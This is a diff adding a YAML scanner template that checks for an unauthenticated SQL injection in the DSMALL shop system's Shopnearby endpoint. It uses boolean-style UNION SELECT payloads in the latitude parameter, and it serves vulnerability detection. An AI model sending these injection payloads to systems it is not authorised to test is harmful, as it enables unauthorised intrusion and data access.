@@ -1,0 +1,24 @@
+id: poc-yaml-dsmall-unauth-sql-injection
+info:
+  name: DSAMLL 未授权 SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: DSAMLL
+  osprey-id: vb_2020_0035
+requests:
+- method: GET
+  path: /index.php/home/Shopnearby/get_Own_Store_List?latitude=(select+1+union+select+1)&longitude=1
+  headers: {}
+  expression: 'contains(body, "goods_id") && !contains(body, "<") && status_code ==
+    200
+
+    '
+- method: GET
+  path: /index.php/home/Shopnearby/get_Own_Store_List?latitude=(select+1+union+select+2)&longitude=1
+  headers: {}
+  expression: '!contains(body, "goods_id") && status_code == 200
+
+    '
+variables: {}
+transport: http
